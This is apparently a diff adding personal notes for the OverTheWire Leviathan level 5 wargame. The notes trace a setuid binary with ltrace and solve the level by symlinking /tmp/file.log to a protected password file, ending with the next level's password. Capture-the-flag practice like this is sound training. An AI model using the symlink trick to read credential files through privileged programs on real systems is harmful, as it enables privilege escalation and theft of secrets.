@@ -1,0 +1,32 @@
+# ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+
+# file.log needed for leviathan5 run but deleted after finished running
+touch /tmp/file.log
+ltrace ./leviathan5
+
+# ============================================
+# TRYING THINGS OUT
+
+echo hi > /tmp/file.log
+ltrace ./leviathan5
+
+# no lower alpha matches
+echo abcdefghijklmnopqrstuvwxyz > /tmp/file.log
+
+# no upper alpha matches
+echo ABCDEFGHIJKLMNOPQRSTUVWXYZ > /tmp/file.log
+
+# no num matches
+echo 0123456789 > /tmp/file.log
+
+# no space / or .
+
+# maybe link?
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+ltrace ./leviathan5
+
+# =======================================================
+
+ln -s  /etc/leviathan_pass/leviathan6 /tmp/file.log && ./leviathan5
+
+> UgaoFee4li 
